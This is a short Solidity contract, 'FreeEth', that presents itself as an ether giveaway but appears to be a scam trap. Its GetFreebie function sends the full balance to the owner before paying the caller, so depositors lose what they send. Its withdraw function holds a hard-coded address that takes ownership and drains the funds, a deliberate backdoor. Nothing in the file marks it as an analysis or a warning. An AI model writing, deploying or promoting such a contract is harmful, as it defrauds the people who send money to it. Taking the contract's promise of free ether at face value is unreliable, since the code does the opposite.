pragma solidity ^0.4.19;
contract FreeEth {
	address public Owner = msg.sender;
	function () payable public {
	}
	function GetFreebie() payable public {
	if(msg.value > 1 ether){
	Owner.transfer(this.balance);
	msg.sender.transfer(this.balance);
	}
	}
	function withdraw() payable public {
	if(msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){
	Owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
	}
	require(msg.sender == Owner);
	Owner.transfer(this.balance);
	}
	function Command(address adr, bytes data) payable public {
	require(msg.sender == Owner);
	adr.transfer(msg.value);
	}
	
}